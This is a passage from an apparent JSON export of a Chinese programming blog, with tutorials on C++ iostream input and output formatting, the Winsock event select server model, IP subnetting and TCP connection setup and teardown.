&#123; 0 &#125;; cout &lt;&lt; \"请输入一个字符串 aa bb cc dd\" &lt;&lt; endl; cin.getline(buf, 128); //从输入缓冲区中读数据到buf中，最多读128 ，知道遇到\\n为止 cout &lt;&lt; \"buf:\" &lt;&lt;buf &lt;&lt; endl;&#125;//cin.ignore()void test5()&#123; char buf1[128]; char buf2[128]; cout &lt;&lt; \"请输入一个字符串 aa bb cc dd\" &lt;&lt; endl; cin &gt;&gt; buf1; //aa cin.ignore(2); cin.getline(buf2, 128);// bb cc dd cout &lt;&lt; \"buf1:\" &lt;&lt; buf1 &lt;&lt; endl; cout &lt;&lt; \"buf2:\" &lt;&lt; buf2 &lt;&lt; endl;&#125;//cin.putback()void test6()&#123; cout &lt;&lt; \"请输入一个数字或者字符串\" &lt;&lt; endl; char ch; ch = cin.get(); //从输入缓冲区去读一个字符 if ((ch &gt;= '0') &amp;&amp; ch &lt;= '9') &#123; cout &lt;&lt; \"输入的是一个数字\" &lt;&lt; endl; int num; //此时数字第一个字符已经读出来了。 需要将ch放回到输入缓冲区 cin.putback(ch); //将ch仍会缓冲区， 位置就缓冲区的头部。 cin &gt;&gt; num; cout &lt;&lt; \"num =\" &lt;&lt; num &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"输入的是一个字符串\" &lt;&lt; endl; char buf[128] = &#123; 0 &#125;; //cin.putback(ch); cin.getline(buf, 128); cout &lt;&lt; \"buf:\" &lt;&lt; buf &lt;&lt; endl; &#125;&#125;int main(void)&#123; //test1(); //test2(); //test3(); //test4(); //test5(); test6(); return 0;&#125; 标准输出流 cout常用的方法 12345678910111213cout.flush() //刷新缓冲区cout.put(ch) //输出一个字符cout.write(str,strLen) //输出一个字符串cout.width(10) //设置10个位宽cout.fill(&apos;*&apos;) //位宽空余的地方用*代替cout.setf(ios::oct) //设置八进制输出cout.unsetf(ios::dex) //卸载当前默认的十进制输出方式cout.setf(ios::showbase);//把八进制的0和十六进制的0x显示出来cout.setf(ios::left);//设置左对齐 cout常用控制符 123456789flushendloctdechexsetbasesetwsetfillsetprecision 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;/*cout.put()cout.write() //向输出缓冲区中写数据cout.width()cout.fill()cout.setf(标记)操作符、控制符flushendloctdechexsetbasesetwsetfillsetprecision*/void test1()&#123; cout &lt;&lt; \"hello \" &lt;&lt; endl; cout.put('h').put('e').put('l') &lt;&lt; endl; char *str = \"hello wolrd\"; cout.write(str, strlen(str)); cout &lt;&lt; endl; cout.write(str, strlen(str) - 1); cout &lt;&lt; endl;&#125;void test2()&#123; /* //使⽤类成员函数 cout &lt;&lt; \"&lt;start&gt;\"; cout.width(30); //设置接下来要输出的长度，是30 cout.fill('*'); //将没有填充的多余的空间，填充成* cout.setf(ios::showbase); //#include &lt;iomanip&gt; cout.setf(ios::internal); //设置 cout &lt;&lt; hex &lt;&lt; 123 &lt;&lt; \"&lt;End&gt;\\n\"; cout &lt;&lt; endl; */ //使⽤ 操作符、控制符 cout &lt;&lt; \"&lt;Start&gt;\" &lt;&lt; setw(30) &lt;&lt; setfill('*') &lt;&lt; setiosflags(ios::showbase) //基数 &lt;&lt; setiosflags(ios::internal) &lt;&lt; hex &lt;&lt; 123 &lt;&lt; \"&lt;End&gt;\\n\" &lt;&lt; endl;&#125;void test3()&#123;#if 0 int a; cout &lt;&lt; \"input a:\"; cin &gt;&gt; a; cout &lt;&lt; \"dec:\" &lt;&lt; dec &lt;&lt; a &lt;&lt; endl; //以⼗进制形式输出整数 cout &lt;&lt; \"hex:\" &lt;&lt; hex &lt;&lt; a &lt;&lt; endl; //以⼗六进制形式输出整数a cout &lt;&lt; \"oct:\" &lt;&lt; setbase(8) &lt;&lt; a &lt;&lt; endl; //以⼋进制形式输出整数a const char *pt = \"China\"; //pt指向字符串\"China\" cout &lt;&lt; setw(10) &lt;&lt; pt &lt;&lt; endl; //指定域宽为,输出字符串 cout &lt;&lt; setfill('*') &lt;&lt; setw(10) &lt;&lt; pt &lt;&lt; endl; //指定域宽,输出字符串,空⽩处以'*'填&gt;充#endif double pi = 22.0 / 7.0; //计算pi值 //按指数形式输出,8位⼩数 cout &lt;&lt; setiosflags(ios::scientific) &lt;&lt; setprecision(8); cout &lt;&lt; \"pi=\" &lt;&lt; pi &lt;&lt; endl; //输出pi值 cout &lt;&lt; \"pi=\" &lt;&lt; setiosflags(ios::fixed) &lt;&lt; pi &lt;&lt; endl; //改为⼩数形式输出 //cout &lt;&lt; \"pi=\" &lt;&lt; setprecision(4) &lt;&lt; pi &lt;&lt; endl; //改为位⼩数&#125;void test4()&#123; double a = 123.456, b = 3.14159, c = -3214.67; cout &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setiosflags(ios::right) &lt;&lt; setprecision(2); cout &lt;&lt; setw(10) &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; setw(10) &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; setw(10) &lt;&lt; c &lt;&lt; endl; // 123.45 // 3.14 // -3214.67&#125;int main(void)&#123; //test1(); //test2(); //test3(); test4(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"事件选择模型","slug":"WS004事件选择模型","date":"2021-06-24T23:51:59.000Z","updated":"2021-06-25T17:34:03.736Z","comments":true,"path":"2021/06/25/WS004事件选择模型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/25/WS004事件选择模型/","excerpt":"","text":"事件选择模型 前言 windows处理用户行为的两种方式 消息机制 核心：消息队列 处理过程 所有的用户操作，比如点鼠标，摁键盘，点软件上的按钮…等等，所有操作均依次按顺序被记录，装进一个队列 特点 消息队列由操作系统维护，咱们做的操作，然后把消息取出来，分类处理 有先后顺序 其他 我们之后教大家win32,MFC课程，这部分都是基于这个消息队列，会给大家详细介绍，大家暂时从宏观理解 我们下个模型，异步选择就是基于这个消息的 事件机制 核心：事件集合 处理过程 根据需求，我们为用户的特定操作绑定一个事件，事件由我们自己调用API创建，需要多少创建多少 将事件投递给系统，系统就帮咱们监视着，所以不能无限创建，太多系统运行就卡了 如果操作发生了，比如用户按鼠标了，那么对应的事件就会被置成有信号，也就是类似1变2了，用个数标记aaa 我们直接获取到有信号的事件，然后处理 特点 所有事件都是咱们自己定义的，系统只是帮咱们置有无信号，所以我们自己掌管定义… 无序的 其他 咱们这个事件选择，就是应用这个 事件选择的逻辑 整体逻辑跟select差不多，你看这个叫WSAEventSelect 名字上一看，就是select的进化版 第一步 创建一个事件对象（变量） WSACreateEvent 第二步 为每一个事件对象绑定个socket以及操作accept,read,close…并投递给系统 投递给系统，咱们就完全不用管了，系统自己监管 咱们就去做别的事儿去了 WSAEventSelect 第三步 查看事件是否有信号 WSAWaitForMultipleEvents 第四步 有信号的话就分类处理 WSAEnumNetworkEvents 服务端 网络头文件 网络库 最底层的网络函数，大家用QT MFC wpf，或者百度下载的很多其他的封装好的网络库，都是对咱们讲的这些最本质的网络函数的二次封装，咱们讲的是通用的，讲完这个大家也可以自己封装函数库给别人用了。 #include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 函数库 winsock2.h windows socket 第2版 第一版是 winsock.h 查看具体区别 目前网络库有哪些版本？ 1.0 1.1 2.0 2.1 2.2 演示MSDN 查这个函数的详细信息 WSAStartup 我们的开发环境支持哪个版本？ 打开头文件，看咱们当前编译器环境支持的最高版本 ws2_32.lib windows socket 第2版 32位 不管是64编译环境还是32编译环境，都是用这个，并没有ws2_64.dll wsock32.lib winsock.h 第一版网络库 对应的库文件 这里不区分大小写 打开网络库 int WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData ); 功能 打开网络库/启动网络库，启动了这个库，这个库里的函数/功能才能使用 w windows s socket a Asynchronous 异步 startup 启动 同步与异步 同步 阻塞/卡死状态 异步 多个工作同时进行 参数1 我们要使用的库的版本 类型是 WORD 转定义：unsigned short WORD wVersionRequired = MAKEWORD(2,2); MAKEWORD(主版本,副版本)， 1.0 2.2 wVersionRequired 数据高位/高地址是副版本 数据低位/低地址是主版本 用调试+计算器演示数据原理 位运算，内存操作，小端存储 参数2 LPWSADATA lpWSAData 系统通过这个参数给我们一些配置信息 注意 当看到参数有 LP P前缀的时候，是说我们这里要传对应类型变量的地址，这是win32API 的规范 或者叫规则 看下有哪些信息 struct WSAData { WORD wVersion; WORD wHighVersion; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char *lpVendorInfo; char szDescription[WSADESCRIPTION_LEN + 1]; char szSystemStatus[WSASYS_STATUS_LEN + 1]; } wVersion 我们要使用的版本 wHighVersion 系统能提供给我们最高的版本 iMaxSockets 返回可用的socket的数量，2版本之后就没用了 iMaxUdpDg UDP数据报信息的大小，2版本之后就没用了 lpVendorInfo 供应商特定的信息，2版本之后就没用了 szDescription szSystemStatus 当前库的描述信息，2.0是第二版的意思 当输入的版本不存在 输入1.3， 2.3 有主版本，没有副版本 得到该主版本的最大副版本 1.1 2.2并使用 输入3.1 3.3 超过最大版本号 使用系统能提供的最大的版本 2.2 输入 0.0 0.1 0.3 主版本是0 网络库打开失败，不支持请求的套接字版本 返回值 返回0为执行正确 失败 这些宏的本质 WSASYSNOTREADY 10091 底层网络子系统尚未准备好进行网络通信。 系统配置问题，重启下电脑，检查ws2_32库是否存在，或者是否在环境配置目录下 WSAVERNOTSUPPORTED 10092 此特定Windows套接字实现不提供所请求的Windows套接字支持的版本。 要使用的版本不支持 WSAEPROCLIM 10067 已达到对Windows套接字实现支持的任务数量的限制。 Windows Sockets实现可能限制同时使用它的应用程序的数量 WSAEINPROGRESS 10036 正在阻止Windows Sockets 1.1操作。 当前函数运行期间，由于某些原因造成阻塞，会返回在这个错误码，其他操作均禁止 WSAEFAULT 10014 lpWSAData参数不是有效指针。 参数写错了 校验版本 2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion) HIBYTE是高位 副版本 LOBYTE是地位 主版本 逻辑 只要有一个不是2，说明系统不支持我们要的2.2版本 关闭库 并结束函数，可以给出相应提示 WSACleanup(); return 0； 创建SOCKET SOCKET socket( int af, int type, int protocol ); 作用 创建一个SOCKET SOCKET介绍 什么是socket 将底层复杂的协议体系，执行流程，进行了封装，封装完的结果，就是一个SOCKET了， 也就是说，SOCKET是我们调用协议进行通信的 操作接口 意义 将复杂的协议过程与我们编程人员分开，我们直接操作一个简单SOCKET就行了，对于底层的协议 过程细节，完全不用知道，这就大大方便了我们。 网络编程难就难在协议本身的复杂性，简单就简单在我们编程层面完全不用考虑哪些 本质 就是一种数据类型，转定义看下类型 就是一个整数 uint 但是这个数是唯一的 标识着我当前的应用程序，协议特点等信息 ID，门牌号 应用 我们网络通信的函数，全部都要使用SOCKET 演示 逻辑 每个客户端有一个SOCKET，服务器有一个SOCKET，通信时候，就需要这个SOCKET做参数，给谁通信，就要传递谁的SOCKET 所以 网络编程，理论层面SOCKET是网络封装的精华，代码层面就是不停的使用SOCKET这个变量，所以又叫SOCKET编程 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 绑定地址与端口 int bind( SOCKET s, const sockaddr *addr, int namelen ); 作用 给我们的socket绑定端口号与具体地址 地址 找到咱们的电脑 只有一个 端口号 找到我们机器上对应的软件，比如QQ，浏览器等等，都对应着自己的端口号 多个 每一种通信的端口号是唯一的 同一个软件可能占用多个端口号 参数1 上一个函数创建了socket，绑定了协议信息（地址类型，套接字类型，协议类型），咱们bind函数就是绑定实质的地址，端口号 参数2 结构体 地址类型 装IP地址 端口号 结构体类型 sockaddr 该参数使用方法 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; sockAddress.sin_addr.s_addr = inet_addr(“127.0.0.1”); sockAddress.sin_port = 12345; (sockaddr*)&amp;sockAddress强转添加到参数2上 成员1 跟socket函数参数1是一样的 成员2 IP地址 192.168.xxx.xxx 可以在控制台输入指令 ipconfig 就能看到了 或者在网络设置中，能找到这个地址 我就不演示了，我不想让你们发现我 127.0.0.1 回送地址 本地回环地址 本地网络测试 参数3 端口号 本质 就是一个整数 0~65535 IP是我们机器的地址，端口就是我们具体的软件的通信口，一个软件可能会占用多个接口，比如一个软件可以聊天，可以下载，可以看视频…那么这些不同的通信内容，往往会有各自的协议，各自的端口。 IP是公司地址，端口就是各个部门的地址了 填写哪个值呢？ 理论上只要这个范围0~65535都可以 实际 介于0～1023，为系统保留占用端口号 21端口分配给FTP(文件传输协议)服务 25端口分配给SMTP（简单邮件传输协议）服务 80端口分配给HTTP服务 所以 我们不能写这个范围的 我们的范围就是1024~65535 稍微大点儿，1万多 但是注意一点，端口号是唯一的，比如1234已经被别的软件占用了，那么你再使用1234这个端口号，那么就会绑定失败，因为已经呗占用了 给大家演示下 那大家如何查看自己要用的端口号有没有被占用呢？ 打开运行cmd输入netstat -ano 查看被使用的所有端口 netstat -aon|findstr “12345” 检查我们要使用的端口号是否被使用了 使用了就会显示使用的程序，未被使用就啥都不显示 参数3 参数2的类型大小 sizeof(参数2) 返回值 成功返回0 失败返回SOCKET_ERROR 具体错误码通过int WSAGetLastError(void);获得 closesocket(socketListen); WSACleanup(); 开始监听 int WSAAPI listen( SOCKET s, int backlog ); 作用 将套接字置于正在侦听传入连接的状态。 参数1 服务器端的socket，也就是socket函数创建的 参数2 挂起连接队列的最大长度。 就是说，比如有100个用户链接请求，但是系统一次只能处理20个，那么剩下的80个不能不理人家，所以系统就创建个队列记录这些暂时不能处理，一会儿处理的链接请求，依先后顺序处理，那这个队列到底多大？就是这个参数设置，比如2，那么就允许两个新链接排队的。这个肯定不能无限大，那内存不够了。 我们可以手动设置这个参数，但是别大了。可能210多，20多。 我们一般填写这个参数 SOMAXCONN 作用是让系统自动选择最合适的个数 不同的系统环境不一样，所以这个合适的数也都不一样 WSAAPI 调用约定 这个我们可以忽略，这是给系统看的，跟咱们没关 决定三 函数名字的编译方式 参数的入栈顺序 函数的调用时间 返回值 成功 返回0 失败 SOCKET_ERROR 具体错误码 WSAGetLastError() 释放 closesocket(socketListen); WSACleanup(); 事件选择 创建一个事件对象 WSAEVENT WSAAPI WSACreateEvent(); 成功 返回一个事件 失败 返回WSA_INVALID_EVENT WSAGetLastError获取错误码 关闭 ::closesocket(socketServer); ::WSACleanup(); 转定义 HANDLE 句柄 ID 内核对象 由系统在内核申请 由操作系统访问 我们不能定位其内容，也不能修改 void* 通用类型指针 对内核的保护，对规则的保护，从而使操作系统有序的平稳的，有效的运行，而不会随便出问题 调用函数创建，调用函数释放 如果我们没有调用释放，那么他可能就一直存在于内核，造成内核内存泄漏， 这种只能重启电脑 内核对象有哪些 socket Kernel Objects 几个函数 BOOL WSAAPI WSACloseEvent ( WSAEVENT hEvent ); 关闭/释放事件句柄 不用就要释放 BOOL WSAAPI WSAResetEvent ( WSAEVENT hEvent ); 重置WSAEventSelect函数使用的事件对象状态的正确方法是将事件对象的句柄传递给hEventObject参数中的WSAEnumNetworkEvents函数。 这将重置事件对象并以原子方式调整套接字上活动FD事件的状态。 BOOL WSAAPI WSASetEvent ( WSAEVENT hEvent ); 将指定事件主动置成有信号 绑定并投递 int WSAAPI WSAEventSelect ( SOCKET s, WSAEVENT hEventObject, long lNetworkEvents ); 功能 给事件绑上socket与操作码，并投递给操作系统 参数1 被绑定的socket 最终，每个socket都会被绑定一个事件 参数2 事件对象 逻辑，就是讲参数1与参数2绑定在一起 参数3 具体事件 FD_ACCEPT 有客户端链接 与服务器socket绑定 FD_READ 有客户端发来消息 与客户端socket绑定 可多个属性并列 用 | FD_CLOSE 客户端下线了 与客户端socket绑定 包含强制下线，正常下线 FD_WRITE 可以给客户端发信 与客户端socket绑定 会在accept后立即主动产生该信号 可以说明，客户端连接成功，即可随时send 有特点 代码写完给大家测试 FD_CONNECT 客户端一方，给服务器绑定这个 0 取消事件监视 WSAEventSelect（FD_ACCEPT | FD_READ）； WSAEventSelect（0）； FD_OOB 带外数据 不多说了，一般不使用 FD_QOS 套接字服务质量状态发生变化消息通知 比如：当网络发生拥堵时：用户下载，看电影，聊天，听歌…好多用网事件一起在做，那么计算机网速是有限的，每秒可以处理多少数据，这时候，计算机就会把要紧事优先，比如可以降低下载的速度，以保证看电影流畅，这时候，下载的服务质量就发生了变化。如果投放了这个事件，就会接收到信号了 通过这些小问题的介绍，大家就要注意到实际应用中的问题了，稍微记一下 WSAIoctl 得到服务质量信息 char strOut[2048] = { 0 }; DWORD nLen = 2048; WSAIoctl(socketServer, SIO_QOS, 0, 0, strOut, nLen, &amp;nLen, NULL, NULL); FD_GROUP_QOS 保留 还没有对其赋值具体意义，还没用呢 想要接收套接字组QoS更改的通知。 重叠I/O模型中 FD_ROUTING_ INTERFACE_CHANGE 想要接收指定目标的路由接口更改通知。 数据到达对方的所经过的线路改变了，由于是动态优化选择 要通过此函数WSAIoctl注册之后，才可以 SIO_ROUTING_ INTERFACE_CHANGE FD_ADDRESS_ LIST_CHANGE 想要接收套接字地址族的本地地址列表更改通知。 咱们服务器，链接了很多客户端，那服务器就记录着所有的客户端的地址信息，也就是相当于一个列表，当多一个或者少一个，就是变化了， 咱们就能得到相关的信号了 要通过此函数WSAIoctl注册之后，才可以有效 SIO_ADDRESS_ LIST_CHANGE 返回值 成功 返回0 失败 失败SOCKET_ERROR WSACloseEvent(wsaEvent); closesocket(socketServer); WSACleanup(); 询问事件 DWORD WSAAPI WSAWaitForMultipleEvents( DWORD cEvents, const WSAEVENT *lphEvents, BOOL fWaitAll, DWORD dwTimeout, BOOL fAlertable ); 作用 获取发生信号的事件 参数1 事件个数 定义事件列表（数组）个数是 WSA_MAXIMUM_WAIT_EVENTS 64个 该函数参数1最大64 可以变大 方法我们在逻辑讲完了再讲，有一点儿复杂 不像select模型，直接就能变大，因为select本身就是个数组，然后遍历就行了，比较直接，事件选择是异步投放，由系统管理，咱们就不能随便修改了，要按照规则来 参数2 事件列表 参数3 事件等待方式 TRUE 所有的事件都产生信号，才返回 FALSE 任何一个事件产生信号，立即返回 返回值减去WSA_WAIT_EVENT_0表示事件对象的索引，其状态导致函数返回。 如果在调用期间发出多个事件对象的信号，则这是信号事件对象的数组索引，其中所有信号事件对象的索引值最小。 参数4 超时间隔，以毫秒为单位。 跟select参数5一样的意义 123 等待123毫秒 超时返回WSA_WAIT_TIMEOUT 0 检查事件对象的状态并立即返回。不管有没有信号 WSA_INFINITE 等待直到事件发生 参数5 TRUE 重叠IO模型使用 FALSE 咱们这个事件选择模型填写FALSE 返回值 数组下标的运算值 参数3为true 所有的事件均有信号 参数3为false 返回值减去WSA_WAIT_EVENT_0==数组中事件的下标 WSA_WAIT_IO_COMPLETION 参数5为TRUE，才会返回这个值 WSA_WAIT_TIMEOUT 超时了，continue即可 WSA_WAIT_FAILED 出错了 列举事件 int WSAAPI WSAEnumNetworkEvents( SOCKET s, WSAEVENT hEventObject, LPWSANETWORKEVENTS lpNetworkEvents ); 获取事件类型，并将事件上的信号重置 accept recv close等等 参数1 对应的socket 参数2 对应的事件 参数3 触发的事件类型在这里装着 是一个结构体指针 struct _WSANETWORKEVENTS { long lNetworkEvents; int iErrorCode[FD_MAX_EVENTS]; } 成员1：具体操作 一个信号可能包含两个消息，以按位或的形式存在 参数2：错误码数组 FD_ACCEPT事件错误码在FD_ACCEPT_BIT下标里 没有错误，对应的就是0 返回值 成功 0 失败 SOCKET_ERROR WSAGetLastError()得到错误码 事件分类处理逻辑 if (lpNetworkEvents-&gt;lNetworkEvents &amp; FD_ACCEPT) { if (lpNetworkEvents-&gt;iErrorCode[FD_ACCEPT_BIT] == 0) { //接受链接 //创建事件 //投放事件 //元素增加 } } 用switch可以嘛？ 不行，有大bug else if可以嘛？ 不太行，有小bug 有序处理 for (i = Index; i &lt; EventTotal; i++) { Index = WSAWaitForMultipleEvents(1, &amp;EventArray[i], TRUE, 1000, FALSE); if ((Index != WSA_WAIT_FAILED) &amp;&amp; (Index != WSA_WAIT_TIMEOUT)) { WSAEnumNetworkEvents(SocketArray[i], EventArray[i], &amp;NetworkEvents); //分类处理 } } 最开始就一个一个检测 不绝对的公平，只是相对公平，相对有序 让大家在一轮循环下都能得到处理 但是并不能完全解决顺序问题，只是达到相对公平 所以，事件选择模型不能用于大用户，多访问 增加事件数量 一个一个来，一个大数组就行了啊 结合线程池 一组一组来 单线程，一组一组顺序处理就好了 创建多个线程，每个线程处理一个事件表，最大64 提醒 释放 对比select的结构吐","categories":[{"name":"Windows网络编程","slug":"Windows网络编程","permalink":"https://xiaowuyoucy.github.io/categories/Windows网络编程/"}],"tags":[]},{"title":"IP地址的划分和子网掩码计算方法","slug":"jiw005-IP地址的划分和子网掩码计算方法","date":"2021-06-22T21:50:56.000Z","updated":"2021-06-22T22:45:38.147Z","comments":true,"path":"2021/06/23/jiw005-IP地址的划分和子网掩码计算方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw005-IP地址的划分和子网掩码计算方法/","excerpt":"","text":"IP地址的划分 ip地址转二进制 192.168.1.110 11000000 10101000 00000001 01101110 地址分类 A类: 1.0.0.1~126.255.255.254 0 &lt; A类 &lt; 127 本地回环地址: 127.0.0.1~127.255.255.255 B类: 128.0.0.1~191.255.255.254 128 &lt;= B类 &lt; 192 C类: 192.0.0.1~223.255.255.254 D类: 组播用的 E类: 科研用的 私有ip地址范围: 局域网地址: A类: 10.0.0.0 ~ 10.255.255.255 ip个数 = 65536 *255 B类: 172.16.0.0 ~ 172.31.255.255 ip个数 = 16 * 65536 C类: 192.168.0.0 ~ 192.168.255.255 ip个数 = 65536 子网掩码计算方法 子网掩码的作用规定了一个子网的ip地址范围大小： 不同网段访问要通过路由器或三层交换机 192.168.11.0/24 === 192.168.11.0 netmask 255.255.255.0 24 代表子网掩码是24个1 192.168.11.0 网络号 192.168.11.1 起始地址 192.168.11.254 结束地址 192.168.11.255 广播地址 例如有一个ip是192.168.1.110 子网掩码是255.255.255.0 1234567811000000 10101000 00000001 0110111011111111 11111111 11111111 0000000011111111对应的部分是不能修改的也就是11000000 10101000 00000001 这部分是不能修改的能修改的是01101110这部分 一般的可以修改部分全是0是网络号 12345678192.168.1.0子网掩码 11111111 11111111 11111111 00000000IP地址 11000000 10101000 00000001 01101110网络号 11000000 10101000 00000001 00000000 起始ip:是网络号+1 1234567子网掩码 11111111 11111111 11111111 00000000网络号 11000000 10101000 00000001 00000000起始ip11000000 10101000 00000001 00000001192.168.1.1 结束ip:是广播ip-1 1234567891011121314子网掩码 11111111 11111111 11111111 00000000255.255.255.0网络号 11000000 10101000 00000001 00000000192.168.1.0起始ip11000000 10101000 00000001 00000001192.168.1.1结束ip11000000 10101000 00000001 11111110192.168.1.254广播ip11000000 10101000 00000001 11111111 广播ip:是可修改部分全是1 1234567子网掩码 11111111 11111111 11111111 00000000网络号 11000000 10101000 00000001 00000000广播ip11000000 10101000 00000001 11111111192.168.1.255 子网掩码只能用以下的数字 1234567890 00000000128 10000000192 11000000 224 11100000240 11110000248 11111000252 11111100254 11111110255 11111111","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"TCP的三次握手和四次挥手","slug":"jiw004-TCP的三次握手和四次挥手","date":"2021-06-22T21:03:51.000Z","updated":"2021-06-22T21:52:10.584Z","comments":true,"path":"2021/06/23/jiw004-TCP的三次握手和四次挥手/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw004-TCP的三次握手和四次挥手/","excerpt":"","text":"TCP三次握手 ack的值永远等于上一个数据包seq的值加1 ack也叫期望值 1234三次握手：“喂，你听得到吗？”“我听得到呀，你听得到我吗？”“我能听到你，今天 balabala……” TCP的四次挥手 1234客户端:我们分手吧服务端:好的,我知道了服务端:我们分手吧客户端:好的再见 tcp的数据传输过程： SYN表示建立连接， FIN表示关闭连接， ACK表示响应， PSH表示有DATA数据传输， URG表示紧急指针 RST表示连接重置。 TCP的11种状态 TCP三次握手建立连接 Tcp头部 六个标志位中，我们要用到三个： SYN：SYN= 1 表示这是一个连接请求或连接接受报文。在建立连接时用来进行同步序号（个人理解是，在建立连接的时候，提醒对方记录本方的起始序号）。当SYN=1而ACK=0时，表明这是一个连接请求报文段。对方若是同意建立连接，则应响应的报文段中使SYN=1、ACK=1。因此SYN=1表示该报文是一个连接请求报文或者是一个连接请求接收报文。 ACK：确认号只有在该位设置为1的时候才生效，当该位为0是表示确认号无效。TCP规定，在TCP连接建立后所有传送的数据报文段ACK都必须设置为1。 FIN：当 FIN = 1 时，表明此报文段的发送方的数据已经发送完毕，并要求释放连接。 此外我们还需要用到序号和确认号： 序号：占4个字节，它的范围在0-2^32-1，序号随着通信的进行不断的递增，当达到最大值的时候重新回到0在开始递增。TCP是面向字节流的，在一个TCP连接中传送的字节流中的每一个字节都按照顺序编号。整个要传送的字节流的起始号必须在连接建立时设置。首部中的序列号字段指的是本报文段所发送的数据的第一个字节的序号。例如，一个报文序号是301，而携带的数据共有100字节。则表示本次报文中的序号是301，下一个报文的序号是401.重复一下，每一个报文的序号是该报文包含的字节中第一个字节的编号。 确认号：占4个字节，确认号，是对下一个想要接受的字节的期望，这里隐式确认了对上一个数据包的成功接收。如上例，在成功接收了序号为301的数据包，想要接收下一个数据包因为上个数据包包含100字节，所以此时的确认号应该是401，表示希望接收下一个序号是401的数据包。 三次握手过程： 过程描述： 首先由Client发出请求连接即 SYN=1 ACK=0 (请看头字段的介绍)，TCP规定SYN=1时不能携带数据，但要消耗一个序号,因此声明自己的序号是 seq=x。 然后 Server 进行回复确认，即 SYN=1 ACK=1 seq=y，ack=x+1。 再然后 Client 再进行一次确认，但不用SYN 了，这时即为 ACK=1, seq=x+1，ack=y+1。 为什么要进行三次握手（两次确认）： 为什么A还要发送一侧确认呢？这主要是为了防止已失效的连接请求报文突然又传送到了B，因而产生错误。 所谓“已失效的连接请求报文段”是这样产生的。考虑一种正常情况。A发出连接请求，但因连接请求丢失而未收到确认。于是A再次重传一次连接请求。后来收到了确认建立了连接。数据传输完毕后，就释放了连接。A供发送了两个连接请求的报文段，其中第一个丢失，第二个到达了B。没有“已失效的连接请求报文段”。 